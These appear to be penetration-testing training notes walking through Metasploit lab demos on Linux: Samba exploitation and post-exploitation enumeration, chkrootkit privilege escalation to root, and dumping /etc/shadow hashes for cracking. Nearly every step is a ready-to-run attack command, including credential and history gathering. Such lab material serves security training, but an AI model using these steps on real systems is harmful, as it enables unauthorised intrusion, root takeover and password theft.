# Linux Post Exploitation Modules

- The MSF provides us with various post exploitation modules for both Windows and Linux.
- We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
  - Enumerate system configuration
  - Enumerate environment variables
  - Enumerate network configuration
  - VM check
  - Enumerate user history

# Linux Post Exploitation Modules

## Overview

After successfully exploiting a Linux system, post-exploitation tasks focus on gathering information about the system and its users. Metasploit provides various **post-exploitation modules** that enable us to perform detailed enumeration and gather critical data from the compromised machine.

## Demo: Linux Post Exploitation Modules

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for **Linux Post Exploitation**:

```bash
workspace -a Linux_PE
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Perform an Nmap scan to identify services on the target system:

```bash
db_nmap -sV [targetIP]
```

Search for the **Samba exploit module**:

```bash
search type:exploit name:samba
```

Use the **Samba is_known_pipename** exploit module to gain initial access:

```bash
use exploit/linux/samba/is_known_pipename
```

Run the exploit to get a **cmd shell session**:

```bash
exploit
```

Check the current working directory:

```bash
pwd
```

Put the session in the background:

```bash
background
```

List all active sessions:

```bash
sessions
```

### Upgrading to Meterpreter Session

To upgrade the **cmd shell session** to a **Meterpreter session**, use the following command:

```bash
sessions -u 1
```

This will upgrade session 1 to a Meterpreter session, which will now be available as session 2.

### Basic Enumeration with the Linux Terminal

Once you have a **Meterpreter session**, you can begin basic system enumeration.

- Check system information:

    ```bash
    sysinfo
    ```

- Check the current user ID:

    ```bash
    getuid
    ```

- Open a Linux shell in the Meterpreter session:

    ```bash
    shell
    ```

- Switch to an interactive Bash shell:

    ```bash
    /bin/bash -i
    ```

- Find out which user is currently logged in:

    ```bash
    whoami
    ```

#### Enumerating User Accounts

- List all user accounts on the system:

    ```bash
    cat /etc/passwd
    ```

- Enumerate the groups of a specific user:

    ```bash
    groups [user]
    ```

#### Enumerating System Information

- Display the Linux distribution release version:

    ```bash
    cat /etc/*issue
    ```

- Display the kernel version:

    ```bash
    uname -r
    ```

- Get detailed system information:

    ```bash
    uname -a
    ```

#### Enumerating Network Information

- Display network interface configuration:

    ```bash
    ifconfig
    ```

- Alternatively, use:

    ```bash
    ip a s
    ```

#### Enumerating Processes

- List running processes:

    ```bash
    ps aux
    ```

#### Enumerating Environment Variables

- Display the environment variables:

    ```bash
    env
    ```

### Using Linux Post Exploitation Modules

#### Enum Configs Module

Search for the **Enum Configs** module:

```bash
search enum_configs
```

Use the module to enumerate configuration files on the target:

```bash
use post/linux/gather/enum_configs
```

Show the available options:

```bash
show options
```

Set the Meterpreter session (replace `[meterpreter session]` with the actual session number):

```bash
set session [meterpreter session]
```

Run the module to gather configuration files:

```bash
run
```

Review the gathered information using the **loot** command:

```bash
loot
```

Display the contents of a specific file:

```bash
cat [path]
```

#### Enumerating Environment Variables

Search for the **env** module:

```bash
search env platform:linux
```

Use the **environment variables** module:

```bash
use post/multi/gather/env
```

Set the session:

```bash
set session [meterpreter session]
```

Run the module:

```bash
run
```

#### Network Enumeration Module

Search for the **enum_network** module:

```bash
search enum_network
```

Use the **Network Enumeration** module to gather network-related information:

```bash
use post/linux/gather/enum_network
```

Show the options:

```bash
show options
```

Set the session:

```bash
set session [meterpreter session]
```

Run the module:

```bash
run
```

You can view the collected information with the **loot** command:

```bash
loot
```

Display specific files:

```bash
cat [path]
```

#### Checking Protection Systems

Search for the **enum_protections** module:

```bash
search enum_protections
```

Use the module to enumerate protection mechanisms on the target:

```bash
use post/linux/gather/enum_protections
```

Show the module info:

```bash
info
```

Set the session (assuming session 3 is active):

```bash
set session 3
```

Run the module:

```bash
run
```

To check where the data is stored, use the **notes** command:

```bash
notes
```

#### System & User Enumeration

Search for the **enum_system** module:

```bash
search enum_system
```

Use the module to enumerate system information:

```bash
use post/linux/gather/enum_system
```

Show the module info:

```bash
info
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

Review the gathered information with the **loot** command:

```bash
loot
```

For example, you can enumerate installed packages by viewing the respective file:

```bash
cat [path/to/installed/packages]
```

#### VM Check Enumeration

To check if the target is running inside a container, use the **checkcontainer** module:

```bash
use post/linux/gather/checkcontainer
```

Show the available options:

```bash
show options
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

To check if the target is running in a virtual machine, use the **checkvm** module:

```bash
search checkvm
use post/linux/gather/checkvm
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

#### Enumerating User History

Search for the **enum_users_history** module:

```bash
search enum_users_history
```

Use the module to gather user history:

```bash
use post/linux/gather/enum_users_history
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

Review the gathered information:

```bash
loot
cat [path to linux.enum.users_749147.txt]
```

### Conclusion

What we accomplished:
- Gained access to a Linux system using the **Samba exploit**.
- Upgraded the initial **cmd shell** to a **Meterpreter session** for more advanced post-exploitation tasks.
- Performed basic system enumeration using the Linux terminal.
- Used various **post-exploitation modules** to gather system information, network details, user history, installed packages, and protection mechanisms.

# Linux Privilege Escalation: Exploiting A Vulnerable Program

- The privilege escalation techniques we can utilize will depend on the version of the Linux kernel running on the target system as well as the distribution release version.
- MSF offers very little in regards to Linux kernel exploit modules, however, in some cases, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate our privileges.

# Linux Privilege Escalation: Exploiting A Vulnerable Program

## Overview

- **Privilege Escalation**: A technique used after gaining initial access to elevate privileges on the target system, typically from a low-privilege user to the root user.
- In this case, we are exploiting a vulnerable program (`chkrootkit`) that runs with elevated privileges and can be used to gain root access on a Linux system.

## Demo: Linux Privilege Escalation: Exploiting A Vulnerable Program

### Step-by-Step Process

Check network configuration:

```bash
ifconfig
```

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the **Linux Privilege Escalation** task:

```bash
workspace -a LinuxPrivEsc
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Initial Access

Perform an Nmap scan to identify services running on the target system:

```bash
db_nmap -sV [targetIP]
```

Search for the **SSH login** auxiliary module to attempt logging in:

```bash
search ssh_login
```

Use the **SSH login** module:

```bash
use auxiliary/scanner/ssh/ssh_login
```

Show the available options:

```bash
show options
```

Set the username and password for SSH login:

```bash
set USERNAME jackie
set PASSWORD password
```

Run the module to establish an SSH session:

```bash
run
```

### Post-Exploitation: Checking Basic Information

Once we have a **cmd shell session** from the SSH login, list all active sessions:

```bash
sessions
```

Switch to the **first session** (assuming it's session 1):

```bash
sessions 1
```

Check the current working directory:

```bash
pwd
```

Open an interactive Bash shell:

```bash
/bin/bash -i
```

Display the Linux distribution information:

```bash
cat /etc/*issue
```

Display the kernel version:

```bash
uname -r
```

### Upgrading to a Meterpreter Session

To upgrade the **cmd shell session** to a **Meterpreter session**, put the session in the background:

```bash
background
```

Use the **session upgrade** command:

```bash
sessions -u 1
```

List all active sessions:

```bash
sessions
```

Switch to the new **Meterpreter session** (now session 2):

```bash
sessions 2
```

### Basic Meterpreter Enumeration

Check system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

Display the contents of the **passwd** file:

```bash
cat /etc/passwd
```

List running processes:

```bash
ps aux
```

### Examining the Vulnerable Program

We examine a binary file (`/bin/check-down`) to understand what it does:

```bash
cat /bin/check-down
```

This file runs `chkrootkit` every 60 seconds. **chkrootkit** is a Linux tool used to scan for rootkits, but versions older than **0.5.0** are vulnerable to a local privilege escalation exploit.

Check the version of `chkrootkit` installed on the target system:

```bash
chkrootkit --help
chkrootkit -V
```

### Exploiting the chkrootkit Vulnerability

Since `chkrootkit` is vulnerable, we can exploit this to escalate our privileges.

Put the session in the background:

```bash
background
```

Search for the **chkrootkit exploit** module:

```bash
search chkrootkit
```

Use the **chkrootkit local privilege escalation** exploit:

```bash
use exploit/unix/local/chkrootkit
```

Show the available options:

```bash
show options
```

Display detailed information about the exploit:

```bash
info
```

Set the path to the vulnerable `chkrootkit` binary:

```bash
set CHKROOTKIT /bin/chkrootkit
```

Run the exploit on the **Meterpreter session** (session 2):

```bash
set SESSION 2
set LHOST eth1
exploit
```

### Verifying Root Access

After successfully exploiting the vulnerability, switch to an interactive shell:

```bash
/bin/bash -i
```

Verify that you now have **root** privileges:

```bash
whoami
```

### Conclusion

What we accomplished:
- Gained initial access to the target system via **SSH login** using Metasploit.
- Performed basic system enumeration and identified that **chkrootkit** was running on the target.
- Verified that the installed version of **chkrootkit** was vulnerable to a local privilege escalation exploit.
- Used Metasploit's **chkrootkit** exploit to escalate privileges from a normal user to **root**, gaining full control of the target system.

This demonstrates how to identify and exploit a vulnerable program for privilege escalation on a Linux system.

# Dumping Hashes with Hashdump

- We can dump Linux user hashes with the hashdump post exploitation module.
- Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.
- The hashdump module can used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with John The Ripper.

# Dumping Hashes with Hashdump

## Overview

- **Hashdump**: A post-exploitation technique that extracts password hashes from a compromised system. These hashes can be cracked offline to retrieve plaintext passwords or used for further attacks like **Pass-The-Hash**.
- **Goal**: After gaining access to a target system, we will use Metasploit's **hashdump** module to dump password hashes from the system.

## Demo: Dumping Hashes with Hashdump

### Step-by-Step Process

Check network configuration:

```bash
ifconfig
```

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for **hashdump**:

```bash
workspace -a hashdump
```

Set the target IP address globally:

```bash
setg [targetIP]
```

### Scanning and Exploiting

Perform an Nmap scan to identify services running on the target system:

```bash
db_nmap -sV [targetIP]
```

Search for the **Samba exploit module**:

```bash
search samba
```

Use the **Samba is_known_pipename** exploit module:

```bash
use exploit/linux/samba/is_known_pipename
```

Run the exploit to gain a **cmd shell session**:

```bash
exploit
```

### Upgrading to Meterpreter Session

Put the **cmd shell session** in the background:

```bash
background
```

List active sessions:

```bash
sessions
```

Upgrade the **cmd shell session** to a **Meterpreter session** (assuming session 1):

```bash
sessions -u 1
```

List sessions again to confirm the Meterpreter session (now session 2):

```bash
sessions
```

### Dumping Hashes with Hashdump

Attempt to dump password hashes using the **hashdump** command:

```bash
hashdump
```

If an error occurs, you need to load the **hashdump** module to gather password hashes from the Linux system.

### Basic Enumeration Before Hashdump

Before proceeding with **hashdump**, gather basic system information:

- Display system information:

    ```bash
    sysinfo
    ```

- Check the current user ID:

    ```bash
    getuid
    ```

- Open a shell session to check who is logged in:

    ```bash
    shell
    whoami
    ```

Exit the shell and put the session in the background:

```bash
Terminate
background
```

### Using the Hashdump Module

Search for the **hashdump** module:

```bash
search hashdump
```

Use the **Linux hashdump** module to gather password hashes:

```bash
use post/linux/gather/hashdump
```

Show the available options:

```bash
show options
```

Set the **Meterpreter session** (replace `[meterpreter session]` with the actual session ID):

```bash
set session [meterpreter session]
```

Run the module to dump the hashes:

```bash
run
```

### Reviewing and Accessing the Dumped Hashes

The **hashdump** module will provide the path to the file containing the dumped password hashes. You can list all captured information using the **loot** command:

```bash
loot
```

Access the file containing the dumped hashes:

```bash
cat [path]
```

### Conclusion

What we accomplished:
- Gained initial access to the target system using a **Samba exploit**.
- Upgraded the initial **cmd shell session** to a **Meterpreter session** for more advanced post-exploitation tasks.
- Used the **hashdump** module to gather password hashes from the compromised Linux system.
- Reviewed and accessed the dumped hashes for further post-exploitation tasks like password cracking or lateral movement.

This demonstrates how to use Metasploit’s **hashdump** feature for password extraction from a compromised Linux system.






